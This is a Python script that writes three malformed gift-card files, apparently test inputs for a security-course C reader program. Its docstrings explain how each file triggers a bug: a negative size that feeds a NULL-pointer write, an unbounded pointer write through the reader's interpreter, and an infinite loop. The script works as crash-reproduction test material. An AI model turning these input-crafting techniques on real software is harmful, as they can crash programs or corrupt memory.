#!/usr/bin/env python3
"""
Generates malformed .gft files that trigger specific bugs in giftcardreader.c.
Kept for reproducibility of how tests/*.gft were built.

Key format quirk this script works around: gift_card_reader()'s outer loop
is `while (!feof(input_fd))`. feof() only becomes true once a read attempt
actually runs past the end of the file. If a file's declared num_bytes
matches its real length exactly, the *final* full, successful read doesn't
trip feof yet -> the loop runs one extra ("phantom") pass against a fresh,
zero-filled malloc'd buffer, and that bogus all-zero pass's struct becomes
the one main() prints (every earlier, real parse is simply discarded).
To make a single real record "stick" (needed for crash2/hang, where the
bug only fires when the parsed data is actually used), we declare num_bytes
a few bytes larger than what's really on disk, so the one real fread()
comes up short and sets feof() immediately -- exactly what
giftcardexamplewriter.c does by accident (declares num_bytes=116 but only
writes 112 body bytes).
"""
import struct
import sys
import os

def le32(n):
    return struct.pack("<i", n)

def pad(b, n):
    b = b[:n]
    return b + b"\x00" * (n - len(b))

def build_crash1(path):
    """
    crash1: giftcard.h's thisgiftcard.num_bytes is read directly off the
    wire as a signed 32-bit int (giftcardreader.c, gift_card_reader()) with
    no sign/range check, and used straight as a malloc() size:
        fread(&ret_val->num_bytes, 4, 1, input_fd);
        ptr = malloc(ret_val->num_bytes);
        fread(ptr, ret_val->num_bytes, 1, input_fd);
    A negative num_bytes (e.g. -1) converts to a near-SIZE_MAX value when
    passed to malloc(), which fails and returns NULL. The next fread()
    into that NULL pointer crashes as soon as it has any byte to write --
    so the file just needs one more byte after the 4-byte size field.
    """
    with open(path, "wb") as f:
        f.write(le32(-1))
        f.write(b"\x00")  # one trailing byte so fread() actually writes

def build_crash2(path):
    """
    crash2: animate() (the THX-1138 interpreter for type=3 "animated
    message" records) lets an embedded program move its write cursor
    (`mptr`) by an arbitrary signed amount with no bounds check:
        case 0x03: mptr += (char)arg1; break;
    and then write through it, also unchecked:
        case 0x02: *mptr = regs[arg1]; break;
    We supply a tiny 3-instruction loop (move cursor +127, write a byte,
    jump back to the start) that runs until the repeatedly-advanced
    `mptr` walks off of mapped memory entirely and the write faults --
    a wild/unbounded pointer write, reliably reached within a few
    thousand fast iterations.

    This is a different root cause from crash1: an unchecked pointer
    *write* driven by an interpreted "program" with no cursor bounds
    check, vs. an unchecked allocation *size* feeding a NULL-pointer
    write.
    """
    merchant = b"MERCHANT_CRASH2"
    customer = b"CUSTOMER_CRASH2"

    body = b""
    body += pad(merchant, 32)
    body += pad(customer, 32)
    body += le32(1)   # number_of_gift_card_records (low byte read) = 1
    body += le32(0)   # record_size_in_bytes (not validated by the reader)
    body += le32(3)   # type_of_record = 3 (animated message)
    body += b"M" * 32   # message

    program = bytearray(256)
    # offset 0: mptr += (char)0x7F (= +127)
    program[0] = 0x03
    program[1] = 0x7F
    program[2] = 0x00
    # offset 3: *mptr = regs[0]  (write through the advanced cursor)
    program[3] = 0x02
    program[4] = 0x00
    program[5] = 0x00
    # offset 6: unconditional jump back to offset 0.
    # animate()'s loop footer always does pc+=3 after the switch, and the
    # 0x09 case itself does pc += (char)arg1 *before* that footer runs, so
    # from pc==program+6 we need 6 + (char)arg1 + 3 == 0, i.e.
    # (char)arg1 == -9 (0xF7 as an unsigned byte).
    program[6] = 0x09
    program[7] = 0xF7
    program[8] = 0x00
    body += bytes(program)

    real_len = len(body)
    declared_num_bytes = real_len + 4  # force a short final fread -> feof()
                                        # trips immediately -> single pass

    with open(path, "wb") as f:
        f.write(le32(declared_num_bytes))
        f.write(body)

def build_hang(path):
    """
    hang: same animate() interpreter, different opcode. Opcode 0x09 is an
    unconditional relative jump: `pc += (char)arg1;`. animate()'s loop
    footer then unconditionally does `pc += 3;` and the only exit check is
    `if (pc > program+256) break;` -- which only ever catches pc running
    off the *end*. A jump of -3 from the instruction right after itself
    nets to zero pc movement each time around the loop
    (pc + (-3) + 3 == pc), so the loop spins on the same instruction
    forever without ever tripping the one-sided bounds check.
    """
    merchant = b"MERCHANT_HANG"
    customer = b"CUSTOMER_HANG"

    body = b""
    body += pad(merchant, 32)
    body += pad(customer, 32)
    body += le32(1)   # number_of_gift_card_records = 1
    body += le32(0)   # record_size_in_bytes
    body += le32(3)   # type_of_record = 3 (animated message)
    body += b"H" * 32   # message

    program = bytearray(256)
    program[0] = 0x09  # opcode: relative jump
    program[1] = 0xFD  # arg1 = -3 (as signed char) -> jumps back to itself
    program[2] = 0x00  # arg2 (unused)
    body += bytes(program)

    real_len = len(body)
    declared_num_bytes = real_len + 4  # same short-read / single-pass trick

    with open(path, "wb") as f:
        f.write(le32(declared_num_bytes))
        f.write(body)

if __name__ == "__main__":
    outdir = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(outdir, exist_ok=True)
    build_crash1(os.path.join(outdir, "crash1.gft"))
    build_crash2(os.path.join(outdir, "crash2.gft"))
    build_hang(os.path.join(outdir, "hang.gft"))
    print("wrote crash1.gft, crash2.gft, hang.gft to", outdir)
